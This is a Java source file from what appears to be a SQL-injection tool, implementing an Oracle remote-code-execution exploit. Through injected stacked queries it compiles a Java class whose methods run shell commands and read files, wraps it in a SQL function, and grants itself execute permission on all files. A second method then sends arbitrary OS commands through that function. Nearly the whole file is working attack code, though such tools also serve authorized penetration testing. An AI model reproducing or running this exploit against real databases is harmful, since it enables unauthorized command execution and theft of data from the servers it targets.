package com.jsql.model.accessible.vendor;

import com.jsql.model.InjectionModel;
import com.jsql.model.accessible.ExploitMode;
import com.jsql.model.accessible.ResourceAccess;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.injection.vendor.model.VendorYaml;
import com.jsql.util.LogLevelUtil;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.Arrays;
import java.util.UUID;

public class ExploitOracle {

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = LogManager.getRootLogger();
    private final InjectionModel injectionModel;

    private static final String RCE_JAVA_UTIL_SRC = "RCE_JAVA_UTIL_SRC";
    private static final String RCE_JAVA_UTIL_FUNC = "RCE_JAVA_UTIL_FUNC";
    private static final String BEGIN = "BEGIN";

    public ExploitOracle(InjectionModel injectionModel) {
        this.injectionModel = injectionModel;
    }

    public void createRce(ExploitMode exploitMode) throws JSqlException {
        if (!Arrays.asList(ExploitMode.AUTO, ExploitMode.QUERY_BODY).contains(exploitMode)) {
            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit method not implemented, using query body instead");
        }

        var pattern = " ; drop java source \"%s\";";
        this.injectionModel.injectWithoutIndex(String.format(pattern, ExploitOracle.RCE_JAVA_UTIL_SRC), "body#drop-src");
        pattern = " ; drop function %s;";
        this.injectionModel.injectWithoutIndex(String.format(pattern, ExploitOracle.RCE_JAVA_UTIL_FUNC), "body#drop-src");
        pattern = " ; %s ";
        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
            ExploitOracle.BEGIN,
            "\\n",
            "EXECUTE IMMEDIATE 'create or replace and compile java source named \"",
            ExploitOracle.RCE_JAVA_UTIL_SRC,
            "\" as import java.io.*; public class ", ExploitOracle.RCE_JAVA_UTIL_SRC, "{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \"\";while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \"\";while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \"\\\\n\";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';",
            "\\n",
            "END;"
        )), "body#add-src");
        this.injectionModel.injectWithoutIndex(
            String.format(pattern, String.join(StringUtils.EMPTY,
                ExploitOracle.BEGIN,
                "\\n",
                "EXECUTE IMMEDIATE 'create or replace function ",
                ExploitOracle.RCE_JAVA_UTIL_FUNC,
                "(p_cmd in varchar2) return varchar2 as language java name ''",
                ExploitOracle.RCE_JAVA_UTIL_SRC,
                ".runCmd(java.lang.String) return String'';';",
                "\\n",
                "END;"
            )),
            ResourceAccess.ADD_FUNC
        );
        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
            ExploitOracle.BEGIN,
            "\\n",
            "dbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');",
            "\\n",
            "END;"
        )), "body#grant-exec");
        var nameDatabase = this.injectionModel.getResourceAccess().getResult(
            String.format(
                "SELECT object_name||'%s' FROM dba_objects WHERE object_name like '%s' and ROWNUM <= 1",
                VendorYaml.TRAIL_SQL,
                ExploitOracle.RCE_JAVA_UTIL_FUNC
            ),
            ResourceAccess.BODY_CONFIRM
        );
        if (!nameDatabase.contains(ExploitOracle.RCE_JAVA_UTIL_FUNC)) {
            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: java function not found");
            return;
        }
        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: java function found");

        var request = new Request();
        request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE_ORACLE);
        request.setParameters(null, null);
        this.injectionModel.sendToViews(request);
    }

    public String runRceCmd(String command, UUID uuidShell) {
        String result;
        try {
            result = this.injectionModel.getResourceAccess().getResult(
                String.format(
                    "SELECT %s('%s')||'%s' FROM dual",
                    ExploitOracle.RCE_JAVA_UTIL_FUNC,
                    command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
                    VendorYaml.TRAIL_SQL
                ),
                ResourceAccess.RCE_RUN_CMD
            );
        } catch (JSqlException e) {
            result = String.format(ResourceAccess.TEMPLATE_ERROR, e.getMessage(), command);
        }
        var request = new Request();
        request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);
        request.setParameters(uuidShell, result);
        this.injectionModel.sendToViews(request);
        return result;
    }
}
